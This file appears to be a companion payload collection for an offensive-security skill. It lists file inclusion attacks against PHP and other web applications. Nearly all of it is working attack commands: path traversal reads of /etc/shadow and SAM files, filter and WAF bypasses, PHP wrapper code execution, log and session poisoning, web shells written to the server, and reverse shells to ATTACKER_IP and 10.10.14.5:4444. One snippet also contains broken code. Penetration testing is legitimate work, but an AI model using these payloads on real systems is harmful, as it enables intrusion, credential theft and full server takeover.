# File Inclusion Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all file inclusion attack payloads organized by category.

---

## 1. LFI Detection (Basic Probes)

Test whether the application includes files based on user-supplied input.

```bash
# Basic path traversal - Linux
curl "http://target/page=../../../etc/passwd"
curl "http://target/page=....//....//....//etc/passwd"
curl "http://target/page=..;/..;/..;/etc/passwd"

# Absolute path inclusion (no traversal needed)
curl "http://target/page=/etc/passwd"
curl "http://target/page=/etc/hostname"
curl "http://target/page=/etc/shadow"

# Basic path traversal - Windows
curl "http://target/page=..\..\..\windows\system32\drivers\etc\hosts"
curl "http://target/page=..\..\..\windows\win.ini"

# Confirm LFI with secondary targets
curl "http://target/page=../../../etc/hostname"
curl "http://target/page=../../../proc/self/cmdline"
curl "http://target/page=../../../proc/self/environ"
curl "http://target/page=../../../etc/issue"

# ffuf with SecLists LFI wordlist
ffuf -u "http://target/page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0 -mc 200 -o lfi_results.txt
```

---

## 2. Path Traversal Bypass Techniques

When basic traversal sequences are filtered, use encoding and obfuscation to bypass defenses.

### URL Encoding

```bash
# Single URL encoding
curl "http://target/page=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target/page=..%2f..%2f..%2fetc/passwd"
curl "http://target/page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

### Double URL Encoding

```bash
# Double URL encoding (server decodes twice)
curl "http://target/page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
curl "http://target/page=..%252f..%252f..%252fetc/passwd"
```

### Null Byte Injection (PHP < 5.3.4)

```bash
# Null byte truncates appended suffix (e.g., .php)
curl "http://target/page=../../../etc/passwd%00"
curl "http://target/page=../../../etc/passwd%00.jpg"
curl "http://target/page=../../../etc/passwd%00.html"
```

### Unicode Encoding

```bash
# Unicode / encoding that web servers may normalize to /
curl "http://target/page=..%c0%af..%c0%af..%c0%afetc/passwd"
curl "http://target/page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
```

### Path Truncation (PHP < 5.3, 4096 byte limit)

```bash
# Generate a long path that gets truncated
python3 -c "print('page=' + '../' * 200 + 'etc/passwd')"
# Or with ./ padding
python3 -c "print('page=' + 'a/' * 2048 + '../' * 20 + 'etc/passwd')"
```

### Filter Stripping Bypass

```bash
# When ../ is stripped once, use ....// which becomes ../ after stripping
curl "http://target/page=....//....//....//etc/passwd"
curl "http://target/page=..././..././..././etc/passwd"
curl "http://target/page=....\/....\/....\/etc/passwd"

# When .php suffix is appended, try null byte or path truncation
curl "http://target/page=../../../etc/passwd%00"
curl "http://target/page=../../../etc/passwd......................."  # truncate
```

### dotdotpwn Automated Fuzzing

```bash
# HTTP GET mode
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o unix

# HTTP POST mode
dotdotpwn.pl -m http -h target.com -x POST -d "page=TRAVERSAL" -o unix

# Specify custom depth
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -d 8 -o unix

# Test specific file
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -f /etc/shadow -o unix

# Output results to file
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o unix -k "root:" > lfi_results.txt
```

---

## 3. PHP Wrapper Exploitation

Leverage PHP stream wrappers to read source code and execute arbitrary code.

### php://filter (Source Code Disclosure)

```bash
# Read PHP source as base64
curl "http://target/page=php://filter/convert.base64-encode/resource=index.php"
curl "http://target/page=php://filter/convert.base64-encode/resource=config.php"
curl "http://target/page=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php"

# Decode the base64 output
echo "PD9waHAg..." | base64 -d

# Read with different encodings
curl "http://target/page=php://filter/read=convert.base64-encode/resource=index.php"
curl "http://target/page=php://filter/convert.base64-encode/resource=../config/database.php"
curl "http://target/page=php://filter/convert.quoted-printable-encode/resource=index.php"

# ROT13 encoding (bypass some WAF)
curl "http://target/page=php://filter/read=string.rot13/resource=index.php"

# String stripping filters
curl "http://target/page=php://filter/read=string.strip_tags/resource=index.php"
```

### php://input (POST Body Code Execution)

```bash
# Execute PHP code via POST body (requires allow_url_include=On)
curl -X POST "http://target/page=php://input" \
  -d '<?php system("id"); ?>'

curl -X POST "http://target/page=php://input" \
  -d '<?php phpinfo(); ?>'

curl -X POST "http://target/page=php://input" \
  -d '<?php echo file_get_contents("/etc/passwd"); ?>'

# Reverse shell via php://input
curl -X POST "http://target/page=php://input" \
  -d '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\""); ?>'

# File listing
curl -X POST "http://target/page=php://input" \
  -d '<?php echo implode("\n", scandir("/var/www/html")); ?>'
```

### data:// Wrapper (Base64 Payload Execution)

```bash
# Execute base64-encoded PHP code
# Base64 of '<?php system("id"); ?>'
curl "http://target/page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id"

# Base64 of '<?php phpinfo(); ?>'
curl "http://target/page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="

# Generate base64 payloads
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Reverse shell via data:// wrapper
SHELL_PAYLOAD=$(echo -n '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\""); ?>' | base64)
curl "http://target/page=data://text/plain;base64,${SHELL_PAYLOAD}"
```

### PHP Filter Chain (Arbitrary Code Execution)

```bash
# Generate filter chain payload with php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'

# Use the generated filter chain as LFI payload
# Example output:
curl "http://target/page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|.../resource=php://temp"

# Reverse shell with filter chain
REVERSE_SHELL='<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""); ?>'
python3 php_filter_chain_generator.py --chain "$REVERSE_SHELL"
```

### phar:// Wrapper (Deserialization)

```bash
# Create a malicious phar file (requires ability to upload)
php -c ./disable_phar_reads.ini << 'PHP'
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->addFromString('test.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setMetadata(new EvilClass());
$phar->stopBuffering();
PHP

# Include via phar://
curl "http://target/page=phar:///tmp/evil.phar/test.txt"
curl "http://target/page=phar://./uploads/evil.png/test.txt"
```

---

## 4. Log Poisoning (LFI-to-RCE)

Inject PHP code into log files, then include the log file through LFI to execute the code.

### Apache Log Poisoning

```bash
# Step 1: Inject PHP code into User-Agent header (gets logged in access.log)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target/any-page"

# Step 2: Include the log file through LFI
curl "http://target/page=../../../var/log/apache2/access.log&cmd=id"

# Alternative log locations
curl "http://target/page=../../../var/log/apache2/error.log&cmd=id"
curl "http://target/page=../../../var/log/httpd/access_log&cmd=id"
curl "http://target/page=../../../var/log/httpd/error_log&cmd=id"

# Inject into Referer header
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" \
  "http://target/page=../../../var/log/apache2/access.log&cmd=id"

# Reverse shell via log poisoning
curl -H "User-Agent: <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\"); ?>" \
  "http://target/any-page"
# Then include the log
curl "http://target/page=../../../var/log/apache2/access.log"
```

### Nginx Log Poisoning

```bash
# Nginx access log location
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target/any-page"
curl "http://target/page=../../../var/log/nginx/access.log&cmd=id"

# Nginx error log
curl "http://target/page=../../../var/log/nginx/error.log&cmd=id"
```

### SSH Log Poisoning

```bash
# SSH logs usernames - inject PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target
# Then include SSH log
curl "http://target/page=../../../var/log/auth.log&cmd=id"
curl "http://target/page=../../../var/log/secure&cmd=id"
```

### Other Log Files

```bash
# FTP log poisoning (inject into FTP username)
ftp target
Name: <?php system($_GET["cmd"]); ?>

# Include FTP log
curl "http://target/page=../../../var/log/vsftpd.log&cmd=id"

# Mail log (send email with PHP payload in subject)
echo "Subject: <?php system(\$_GET['cmd']); ?>" | sendmail -t user@target
curl "http://target/page=../../../var/log/mail.log&cmd=id"
```

---

## 5. /proc/self/environ Exploitation

Include `/proc/self/environ` which contains environment variables, including injected User-Agent values.

```bash
# Step 1: Inject PHP code into User-Agent (reflected in environ)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target/page=../../../proc/self/environ&cmd=id"

# Step 2: Verify command execution
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://target/page=../../../proc/self/environ&cmd=whoami"

# Step 3: Get reverse shell
curl -H "User-Agent: <?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\"); ?>" \
  "http://target/page=../../../proc/self/environ"

# Read other /proc files
curl "http://target/page=../../../proc/self/cmdline"
curl "http://target/page=../../../proc/self/stat"
curl "http://target/page=../../../proc/self/fd/0"
curl "http://target/page=../../../proc/self/fd/1"
curl "http://target/page=../../../proc/self/fd/2"
```

---

## 6. Session File Inclusion

Inject PHP code into session variables and include the session file.

```bash
# Step 1: Identify session cookie name
# Check cookies in browser or Burp: PHPSESSID=abc123...

# Step 2: Inject PHP code into session variable
# Many applications store user input in session variables
curl -b "PHPSESSID=abc123" \
  -X POST "http://target/login" \
  -d "username=<?php system(\$_GET['cmd']); ?>&password=test"

# Step 3: Include the session file
curl "http://target/page=../../../tmp/sess_abc123&cmd=id"

# Session file locations
curl "http://target/page=../../../tmp/sess_abc123&cmd=id"
curl "http://target/page=/var/lib/php/sessions/sess_abc123&cmd=id"
curl "http://target/page=C:/Windows/Temp/sess_abc123&cmd=id"

# Find session ID from cookie
# If cookie: PHPSESSID=a1b2c3d4e5f6
# Session file: /tmp/sess_a1b2c3d4e5f6

# Brute force session files with ffuf
ffuf -u "http://target/page=../../../tmp/sess_FUZZ" \
  -w /usr/share/seclists/Fuzzing/numbers.txt \
  -mc 200 -fs 0
```

---

## 7. RFI (Remote File Inclusion)

Include remote files hosted on attacker-controlled servers (requires `allow_url_include=On`).

### Hosting Malicious Payload

```bash
# Create malicious PHP file
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Start HTTP server to host payload
python3 -m http.server 80
# Or with PHP built-in server
php -S 0.0.0.0:80

# Create reverse shell payload
cat > rs.php << 'EOF'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
EOF
```

### RFI Exploitation

```bash
# Include remote payload
curl "http://target/page=http://ATTACKER_IP/shell.php&cmd=id"

# Include remote reverse shell
curl "http://target/page=http://ATTACKER_IP/rs.php"

# RFI with different extensions (some filters check extension)
curl "http://target/page=http://ATTACKER_IP/shell.txt"
curl "http://target/page=http://ATTACKER_IP/shell.jpg"
curl "http://target/page=http://ATTACKER_IP/shell.png%00"

# RFI via FTP
curl "http://target/page=ftp://ATTACKER_IP/shell.php"

# RFI via SMB (Windows targets)
curl "http://target/page=\\ATTACKER_IP\share\shell.php"

# Test if allow_url_include is enabled
curl "http://target/page=http://ATTACKER_IP/test.txt"
```

### PHP auto_prepend_file / auto_append_file Abuse

```bash
# If .htaccess is writable or php.ini can be set via user ini files
# Create .user.ini in upload directory
cat > .user.ini << 'EOF'
auto_prepend_file=shell.php
EOF

# Or with auto_append_file
cat > .user.ini << 'EOF'
auto_append_file=http://ATTACKER_IP/shell.php
EOF

# Create the shell in the same directory
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

---

## 8. Common LFI Target Files

### Linux Target Files

```bash
# System files
/etc/passwd
/etc/shadow
/etc/hostname
/etc/issue
/etc/hosts
/etc/resolv.conf
/etc/crontab
/etc/fstab

# Network information
/proc/net/tcp
/proc/net/udp
/proc/net/arp
/proc/net/if_inet6
/proc/net/fib_trie

# Process information
/proc/self/cmdline
/proc/self/environ
/proc/self/stat
/proc/self/fd/0..9
/proc/self/maps
/proc/self/cwd/index.php

# Web server configuration
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default

# Log files
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/mysql/mysql.log

# PHP configuration
/etc/php/X.X/apache2/php.ini
/etc/php/X.X/cli/php.ini
```

### Windows Target Files

```bash
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\sam
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\panther\unattend.xml
C:\Windows\System32\inetsrv\config\applicationHost.config

# IIS logs
C:\inetpub\logs\LogFiles\W3SVC1\exYYYYMMDD.log

# Application files
C:\xampp\htdocs\config.php
C:\wamp\www\configuration.php
```

---

## 9. kadimus Automated Exploitation

```bash
# Basic LFI scan
kadimus -u "http://target/page=test"

# Source code disclosure
kadimus -u "http://target/page=test" --source-disclosure -o source_code/

# Automatic exploitation (log poisoning, /proc/self/environ)
kadimus -u "http://target/page=test" --auto

# Execute commands via LFI
kadimus -u "http://target/page=test" -o "exec" -c "id"

# Reverse shell
kadimus -u "http://target/page=test" -o "reverse" \
  --reverse-ip ATTACKER_IP --reverse-port 4444

# PHP wrapper exploitation
kadimus -u "http://target/page=test" --php-wrapper input -c "id"

# Scan list of URLs
kadimus -u "http://target/page=test" -o "scan" --list urls.txt
```

---

## 10. fimap Scanning and Exploitation

```bash
# Scan a single URL
fimap -u "http://target/page=test"

# Scan with automatic exploitation
fimap -u "http://target/page=test" -x

# Scan from burp request file
fimap -r request.txt

# Scan multiple URLs from file
fimap -l urls.txt -x

# Specify custom parameter
fimap -u "http://target/index.php" --param="page" -x

# Exploit mode (after scanning)
fimap -H  # Harvest mode - find exploitable parameters
fimap -x  # Automatic exploitation
```

---

## 11. Advanced Payloads

### PHP Temporary File Race Condition

```bash
# PHP stores uploaded files temporarily in /tmp/phpXXXXXX
# Race to include the file before it is deleted

# Step 1: Continuously try to include the temp file
while true; do
  curl "http://target/page=/tmp/phpXXXXXX" 2>/dev/null
done

# Step 2: Simultaneously upload a PHP file via POST
curl -X POST "http://target/upload" \
  -F "file=@shell.php"

# Use a brute-force approach with ffuf against /tmp
ffuf -u "http://target/page=/tmp/FUZZ" \
  -w <(for i in $(seq 1 1000); do echo "php$(printf '%s' $i | md5sum | cut -c1-6)"; done) \
  -mc 200
```

### Expect Wrapper (if enabled)

```bash
# PHP expect:// wrapper allows command execution directly
curl "http://target/page=expect://id"
curl "http://target/page=expect://whoami"
curl "http://target/page=expect://cat%20/etc/passwd"
```

### Input Wrapper with Multi-Command Payload

```bash
# Write a web shell via php://input
curl -X POST "http://target/page=php://input" \
  -d '<?php
    file_put_contents("shell.php", "<?php system(\$_GET[cmd]); ?>");
    echo "Shell written successfully";
  ?>'

# Verify the shell
curl "http://target/shell.php?cmd=id"
```

### PostgreSQL Large Object Injection

```bash
# If LFI can reach PostgreSQL large objects
# Export PHP code as a large object, then include it
psql -h target -U postgres -c "
  SELECT lo_create(1234);
  INSERT INTO pg_largeobject (loid, pageno, data)
  VALUES (1234, 0, '<?php system(\$_GET[\"cmd\"]); ?>');
  SELECT lo_export(1234, '/var/www/html/shell.php');
"
```

### PHP Filter Chain Reverse Shell Generator

```bash
# Generate filter chain payload for reverse shell
REVSHELL='<?php $sock=fsockopen("10.10.14.5",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>'
python3 php_filter_chain_generator.py --chain "$REVSHELL"

# Use the generated chain payload
curl "http://target/page=php://filter/convert.iconv.UTF8.CSISO2022KR|...|convert.base64-decode/resource=php://temp"
```

### PHP Info File Disclosure via LFI

```bash
# Read /proc/self/fd/X to access file descriptors of the web server process
for fd in $(seq 0 20); do
  echo "Testing fd $fd"
  curl -s "http://target/page=../../../proc/self/fd/$fd" | head -5
done

# Access PHP temporary upload files via /proc/self/fd
# Combine with file upload for race condition exploitation
curl -X POST "http://target/upload" -F "file=@shell.php" &
while true; do
  curl -s "http://target/page=/tmp/php*" 2>/dev/null | grep -q "shell" && break
done
```

### PHP Pearcmd Exploitation

```bash
# If register_argc_argv is enabled and pearcmd.php exists
# Execute commands via pearcmd.php config-create
curl "http://target/page=/usr/local/lib/php/pearcmd.php+config-create+/<?=@eval(\$_POST[cmd])?>+/var/www/html/shell.php"

# Verify shell was written
curl -X POST "http://target/shell.php" -d "cmd=id"
```

### Temp File Monitoring and Race Condition Automation

```bash
# PHP stores uploaded files in /tmp/phpXXXXXX (6 random chars)
# Generate wordlist of possible temp file names
python3 -c "
import itertools, string
chars = string.ascii_lowercase + string.digits
for combo in itertools.product(chars, repeat=6):
    print('php' + ''.join(combo))
" > /tmp/php_tmp_wordlist.txt

# Race condition: continuous inclusion + upload
# Terminal 1: continuous inclusion attempt
while true; do
  curl -s "http://target/page=/tmp/phpFUZZ" 2>/dev/null | grep -v "^$" && break
done < /tmp/php_tmp_wordlist.txt

# Terminal 2: simultaneous upload
for i in $(seq 1 100); do
  curl -s -X POST "http://target/upload.php" -F "file=@shell.php" > /dev/null
done
```

### PHP Session Upload Progress Tracking Exploitation

```bash
# PHP 5.4+ stores upload progress in session when session.upload_progress.enabled
# Check phpinfo for session.upload_progress settings
curl "http://target/page=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_$(echo -n 'ATTACKER_PHPSESSID' | md5sum | cut -c1-32)"

# Race condition via upload progress - PHP stores temp file path in session
# Step 1: Start upload with progress tracking
curl -X POST "http://target/upload.php" \
  -F "file=@shell.php" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=1" \
  -b "PHPSESSID=attacker_session" &

# Step 2: Include session file simultaneously
while true; do
  curl -s "http://target/page=/var/lib/php/sessions/sess_attacker_session" 2>/dev/null | grep -q "tmp_name" && break
done
```

---

## 12. PHP Wrapper Combinations and Chaining

### Chained PHP Filter for Code Execution

```bash
# Chain multiple PHP filters to bypass WAF detection
# Convert to ROT13, then base64 encode, then strip tags
curl "http://target/page=php://filter/read=string.rot13|convert.base64-encode/resource=config.php"

# Read source through multiple encoding layers
curl "http://target/page=php://filter/read=convert.quoted-printable-encode|convert.base64-encode/resource=index.php"

# Use zlib filter to decompress on-the-fly
curl "http://target/page=php://filter/zlib.inflate/resource=compressed_data.php"
```

### PHP zip:// Wrapper Exploitation

```bash
# Upload a ZIP containing a PHP shell, then include via zip:// wrapper
# Step 1: Create the malicious ZIP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# Step 2: Upload the ZIP file through any upload endpoint
curl -X POST "http://target/upload" -F "file=@shell.zip"

# Step 3: Include the PHP file from within the ZIP
curl "http://target/page=zip:///var/www/html/uploads/shell.zip%23shell.php&cmd=id"
```

### Advanced Path Traversal with Encoding Chains

```bash
# Triple URL encoding for deeply nested decoding engines
curl "http://target/page=%2525252e%2525252e%2525252e%2525252e%2525252e%2525252eetc/passwd"

# Mixed encoding: URL + double-dot with semicolon (IIS/JVM)
curl "http://target/page=/..;/..;/..;/etc/passwd"
curl "http://target/page=..%252f..%252f..%252fetc/passwd"

# Overlong UTF-8 encoding of path separators
curl "http://target/page=..%c0%af..%c0%af..%c0%afetc/passwd"
curl "http://target/page=..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd"
```

### PHPPEAR Channel Exploitation Variants

```bash
# Pearcmd with different PHP installations
curl "http://target/page=/usr/share/php/pearcmd.php+config-create+/<?=phpinfo();?>+/var/www/html/info.php"
curl "http://target/page=/usr/local/share/pear/pearcmd.php+config-create+/<?=system(\$_GET[0]);?>+/var/www/html/cmd.php"

# Peclcmd variant
curl "http://target/page=/usr/share/php/peclcmd.php+config-create+/<?=system(\$_GET[0]);?>+/var/www/html/s.php"
```

### LFI to RCE via /proc/self/fd Race Condition

```bash
# Race condition using /proc/self/fd to include PHP temp upload files
# Terminal 1: continuously probe file descriptors
for fd in $(seq 3 50); do
  curl -s "http://target/page=/proc/self/fd/$fd" | grep -q "output" && echo "HIT on fd $fd"
done

# Terminal 2: simultaneously upload PHP payload in a loop
while true; do
  curl -s -X POST "http://target/upload" -F "file=@shell.php" > /dev/null
done
```

### Tomcat and Java LFI Techniques

```bash
# Read Tomcat web.xml via path traversal
curl "http://target/page=../../../usr/share/tomcat9/conf/web.xml"

# Read Tomcat user credentials
curl "http://target/page=../../../etc/tomcat9/tomcat-users.xml"

# Access Java application class files via LFI
curl "http://target/page=../../../opt/tomcat/webapps/ROOT/WEB-INF/classes/Application.class" --output app.class
javap -c app.class
```

---

## 13. LFI Automation with Custom Scripts

### Python LFI Fuzzer

```python
#!/usr/bin/env python3
"""Automated LFI payload testing script."""
import requests
import sys

TARGET = sys.argv[1]
PARAM = sys.argv[2] if len(sys.argv) > 2 else "page"

payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
]

for payload in payloads:
    try:
        r = requests.get(f"{TARGET}?{PARAM}={payload}", timeout=10)
        indicators = ["root:", "bin/bash", "PD9waH", "/bin/sh"]
        found = any(ind in r.text for ind in indicators)
        if found or r.status_code == 200:
            print(f"[HIT] {payload[:50]}... (status={r.status_code}, len={len(r.text)})")
    except Exception as e:
        print(f"[ERR] {payload[:30]}: {e}")
```

### LFI Scanner with Response Analysis

```bash
# Batch LFI testing with curl and response analysis
while read target; do
  echo "Testing: $target"
  for depth in 1 2 3 4 5 6 7 8; do
    traversal=$(printf '../%.0s' $(seq 1 $depth))
    response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
      "${target}?page=${traversal}etc/passwd")
    code=$(echo "$response" | cut -d: -f1)
    size=$(echo "$response" | cut -d: -f2)
    [ "$code" = "200" ] && [ "$size" -gt 100 ] && echo "  DEPTH $depth: $response"
  done
done < targets.txt
```

---

## 14. LFI Exploitation with Burp Suite

### Burp Suite LFI Payload Lists

```bash
# Generate LFI payload list for Burp Intruder
python3 -c "
for depth in range(1,9):
    for prefix in ['', '/']:
        for target in ['/etc/passwd', '/etc/shadow', '/etc/hosts', '/proc/self/environ', '/var/log/apache2/access.log']:
            traversal = '../' * depth
            print(f'{prefix}{traversal}{target}')
" > /tmp/lfi_payloads.txt

# Generate double-encoded payloads
python3 -c "
import urllib.parse
for depth in range(1,7):
    traversal = '../' * depth
    double = urllib.parse.quote(urllib.parse.quote(traversal))
    print(f'{double}etc/passwd')
" >> /tmp/lfi_payloads.txt
```

### LFI to RCE via Log Poisoning Automation

```bash
# Automated log poisoning and shell access
TARGET="http://target/page="
LOG_PATH="../../../var/log/apache2/access.log"

# Inject PHP backdoor into access log
curl -s -H "User-Agent: <?php if(isset(\$_GET['c'])){system(\$_GET['c']);} ?>" "$TARGET" > /dev/null

# Test command execution via poisoned log
curl -s "${TARGET}${LOG_PATH}&c=id" | grep "uid="
```

---

## 15. PHP Configuration File Discovery via LFI

### phpinfo() Information Gathering

```bash
# Read PHP configuration via LFI to identify useful settings
curl "http://target/page=php://filter/convert.base64-encode/resource=phpinfo.php" | base64 -d | grep -E "allow_url_include|register_globals|open_basedir|upload_tmp_dir|disable_functions"

# Extract PHP configuration paths from phpinfo via LFI
curl "http://target/page=../../../tmp/sess_PHPSESSID" | grep -iE "php.ini|upload|include_path"
```

### LFI to RCE via PHP ini Settings

```bash
# Abuse session.upload_progress for file writing
# Check if session.upload_progress.cleanup is Off
curl "http://target/page=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_$(echo -n test | md5sum | cut -c1-32)" | base64 -d

# Write to .htaccess via PHP wrapper (if writable)
curl -X POST "http://target/page=php://input" \
  -d '<?php file_put_contents(".htaccess","php_value auto_prepend_file /tmp/shell.php"); ?>'
```

---

## 16. LFI WAF Bypass Techniques

### HTTP Parameter Pollution for LFI

```bash
# Use HTTP parameter pollution to confuse WAF rules
curl "http://target/page=../../../etc/passwd&page=safe_value"
curl "http://target?page=safe_value&page=../../../etc/passwd"

# Fragment-based LFI bypass
curl "http://target/page=../../../etc/passwd%23.jpg"
```

### Double URL Encoding Bypass

```bash
# Double-encode path traversal to bypass WAF decoding
python3 -c "
import urllib.parse
traversal = '../../../etc/passwd'
single = urllib.parse.quote(traversal)
double = urllib.parse.quote(single)
print(f'Single: {single}')
print(f'Double: {double}')
curl http://target/page={double}
"
```

### ASP.NET ViewState LFI

```bash
curl "http://target/page=../../../etc/passwd%00.aspx"
```
